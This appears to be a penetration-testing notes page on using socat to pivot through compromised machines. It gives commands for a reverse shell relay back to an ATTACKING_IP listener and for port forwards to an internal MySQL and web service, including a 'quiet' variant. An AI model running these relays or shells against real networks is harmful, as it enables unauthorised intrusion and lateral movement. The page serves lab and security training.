---
description: >-
  Socat is not just great for fully stable Linux shells, it's also superb for
  port forwarding.
---

# Socat

The one big **disadvantage** of socat (aside from the frequent problems people have learning the syntax), is that it is **very rarely installed by default** on a target.

Whilst the following techniques could not be used to **set up a full proxy into a target network**, it is quite possible to use them to successfully **forward ports** from both Linux and Windows **compromised targets**. In particular, socat makes **a very good relay**:

* For example, if you are attempting to get a **shell** on a **target** that does not have a **direct connection back** to your attacking computer, you could use socat to set up **a relay** on the **currently compromised machine**. This **listens** for the reverse shell from the target and then **forwards it immediately** back to the **attacking box**:

![](<../../.gitbook/assets/image (50).png>)

`Socat static binaries :`

{% embed url="https://github.com/andrew-d/static-binaries" %}

```
Think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things.

Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. 
Specifically, in the above example we're creating a port forward from a port on the compromised server to a listening port on our own box. We could do this the other way though, by either forwarding a connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the attacking machine with the service on the internal server. This latter application is especially useful as it does not require opening a port on the compromised server.
```

***

### Reverse Shell Relay

_Socat_ to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above).

```
# 1. First start a nc listener on the attacking box
sudo nc -lvnp 443

# 2. Next, on the compromised server, to start the relay:
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &

** Note: the order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.

- tcp-l:8000 is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
- tcp:ATTACKING_IP:443 connects back to our local IP on port 443. 
```

* In this way, we can set up **a relay to send reverse shells through a compromised system**, back to our own **attacking machine**. This technique can also be chained quite easily; however, in many cases it may be **easier** to just upload **a static copy of netcat** to receive your reverse shell **directly on the compromised server**.

### Port Forwarding -- Easy

With _socat_ simply to open up a **listening port** on the **compromised server**, and **redirect whatever comes** into it to the **target server**.

* For example, if the **compromised server** is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create **a port forward**:

```
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
# 33060 : the port we opened on the compromised server
# 3306 : the port opened on the intended target server

- fork : used to put every connection into a new process
- reuseaddr : the port stays open after a connection is made to it
- Combined, they allow us to use the same port forward for more than one connection. 
```

This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10.

* We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

### Port Forwarding -- Quiet

This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

```
# 1. On the attacking machine :
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.

```
# 2. On the compromised relay server, execute:
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:

```
./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &

// This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to localhost:8000 in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!
```
